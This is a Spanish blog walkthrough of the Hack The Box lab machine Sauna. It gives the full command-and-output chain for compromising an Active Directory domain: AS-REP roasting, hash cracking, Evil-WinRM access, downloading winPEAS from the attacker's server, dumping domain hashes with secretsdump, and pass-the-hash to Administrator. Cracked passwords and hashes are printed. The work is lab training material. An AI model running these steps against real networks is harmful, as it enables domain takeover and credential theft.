---
layout: post
title: Sauna - Walkthrough
date: 2020-07-18 20:44
description: 18 de Julio y acaban de retirar la VM Sauna, sale walktrough de una máquina Windows fácil con foco en Windows Remote Manager para escalar privilegios y sin usar Metasploit.
toc: true
comments: true
tags: 
 - OSCP
 - Walkthrough
 - HackTheBox

---

## **Walkthrough de Sauna**
---

![img]({{ '/assets/images/Sauna/sauna_00.png' | relative_url }}){: .center-image }*(Descripción)*

---
18 de Julio y acaban de retirar la VM Sauna, sale walktrough de una máquina Windows fácil (No para mi) con foco en Windows Remote Manager para escalar privilegios y sin usar Metasploit.

---

## **Links**
[Sauna en Hack The Box](https://www.hackthebox.eu/home/machines/profile/229)



## **Reconocimiento**
---
>**`nmap -T4 -p- 10.10.10.175`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 10:16 -03
Nmap scan report for 10.10.10.175
Host is up (0.17s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49694/tcp open  unknown
56080/tcp open  unknown
```

---


>**`nmap -A -T4 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.10.10.175 -oA Sauna`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-11 10:46 -03
Nmap scan report for 10.10.10.175
Host is up (0.20s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-11 20:49:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/11%Time=5F09C2A9%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h02m50s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-07-11T20:51:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 311.71 seconds
```
---

Después de pasar más tiempo del que me gusta reconocer investigando todos los puertos relacionados con **Active Directory**, **SMB** o **DNS** no avancé mucho. Sin embargo, la suite [Impacket](https://github.com/SecureAuthCorp/impacket) se comporne de varios scripts para conseguir información de **Kerberos** o **SMB**. En este caso use `GetNPUsers.py` para encontrar usuarios dentro del dominio **EGOTISTICAL-BANK.LOCAL** que nos entregó el escaneo de **nmap**.

Previamente se puede sacar información de usuarios del dominio accediendo a la página web que responde en el puerto `80`.

---

![img]({{ '/assets/images/Sauna/sauna_01.png' | relative_url }}){: .center-image }*(Usuarios en la página web)*

---

Basandose en esos nombres se puede hacer una lista de usuarios. Adivinando un poco, la nomenclatura de los usuarios de dominio es la siguiente:

* fsmith
* scoins
* sdriver
* hbear
* btaylor
* skerb

Ahora si, con la lista de usuarios y la herramienta `GetNPUsers.py` hay que pegarle a la VM atacada de la siguiente manera:


>**`python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users -outputfile hashes.txt -dc-ip 10.10.10.175`**
```bash
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
---

Al finalizar el comando parece que no hizo nada pero el arhivo `hashes.txt` tiene la siguiente información:

```bash
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a85c26556eb1c97a14ff189422ac61b2$24125e59be7e62bb57c7f896e2b3d1f27982b3f3dba55d1b442c54e124429242e48e4b1011a13d3dea70cb0aec30d299b5df373dc05186cbb103e1c6b426885b7ad0457f799b3d9a46b422cb876f2c4f622bbcc4d476ce51c5a1d1c01e72dc0cfe079d85a5e56c22f0c97f94e37e5303cb2c7d8e9331fac874938568626060ceaae6d2466e776d2bbff50e8005cf55d1e20b6890240159ebb4aa88c169ac262373d696de1f2ca3d186c964ff878584f2c32615228a7c20bbc81f95bc3bce8adbc425154f5535ad4fee9ad56cf08b604bb18b06483040526214ff357bdba7ef3f386cc47cd195e75557ef32e430482fb888bb09037c63ea91f620cfcf74c7aa6d
```
---

Lo que hace el comando es tratar de listar (en base a la lista que le pasamos) los usuarios que tienen la propiedad `Do not require Kerberos preauthentication` y si es así devuelve un hash en formateado para poder ser crackeado por fuerza bruta con `John The Ripper`.

---

El próximo paso es crackear el hash con el siguiente comando:

> **`john -wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`**

```bash
Created directory: /home/pablog/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:03:09 54.54% (ETA: 23:07:42) 0g/s 41723p/s 41723c/s 41723C/s giannkarlo..gianaishot
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:04:14 DONE (2020-07-16 23:06) 0.003931g/s 41433p/s 41433c/s 41433C/s Thrall..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

---

Después de unos minutos se puede apreciar que el password para el usuario `fsmith` es `Thestrokes123`.

Ya que tenemos un usuario con una contraseña se puede usar una herramient llamada [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) que tiene la capacidad de abusarse del servicio de **WIndows Remote Management** que normalmente responde en el puerto `5985`.

Esta herramienta no viene instalada por defecto en Kali, para instalarla hay que correr el siguiente comando:

> **`sudo gem install evil-winrm`**

Ua vez instalado se corre de la siguiente manerda:

> **`evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23`**

Si todo sale bien el comando devuelve una linea de comandos remota, entramos!

---




### **Flag de User**
---

Dentro de la carpeta `Desktop` del usuario **fsmith** se encuentra la flag del usuario.

```console
*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
1b5520b98d97cf17f24122a55baf70cf
```

Listo el usuario, ahora a escalar privilegios para ir por el root.

Lo ideal es descargar un script que analice la VM en busca de vectores para escalar, la que usé en este momento fue [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) y que viene en formato `exe` y `bat`, yo fui por el bat. Se descarga el script en la máquina atacante y se levanta un sevidor web con **Python**. Existe la opción de descargar el script directamente desde la VM atacada pero en este caso no tenía salida a internet.

> **`sudo python3 -m http.server 80`**

y desde la shell reversa se ejecuta el siguiente comando (aprovechando que Evil-winRM nos da linea de comandos de PowerShell):

> **`Invoke-WebRequest -Uri http://10.10.15.79/winPEAS.bat -OutFile winpeas.bat`**

Se ejecuta de la suguiente manera

> **`c:winpeas.bat`**

Lo que sigue es un recorte de la tremenda cantidad de información que arroja el comando, la parte intereante:

```console
[i] Searching specific files that may contains credentials.
  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
Looking inside HKCU\Software\ORL\WinVNC3\Password
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```
---


### **Flag de Root**
---

Se ve claramante que el usuario **svc_loanmanager** tiene como password `Moneymakestheworldgoround!`

Nuevamente, voy a usar una herramienta contenida dentro de la suite **Impacket** llamada [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py).



> **`secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround\!@10.10.10.175`**

```console
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:a7689cc5799cdee8ace0c7c880b1efe3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:5f39f2581b3bbb4c79cd2a8f56e7f3427e707bd3ba518a793825060a3c4e2ef3
SAUNA$:aes128-cts-hmac-sha1-96:c628107e9db1c3cb98b1661f60615124
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up...
```

Administrator:500:aad3b435b51404eeaad3b435b51404ee:**d9485863c1e9e05851aa40cbb4ab9dff**:::

Por suerte el comnando devuelve el hash del usuario **Administrator** lo único que resta hacer es correr nuevamente la herramienta **Evil-winRM** pero con el parámetro -H al que se le pasa el hash se acaba de encontrar:

> **`evil-winrm -i 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff`**

Genial! Reverse shell con usuario Administrator, al Desktop!:

```console
Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
f3ee04965c68257382e31502cc5e881f
```

---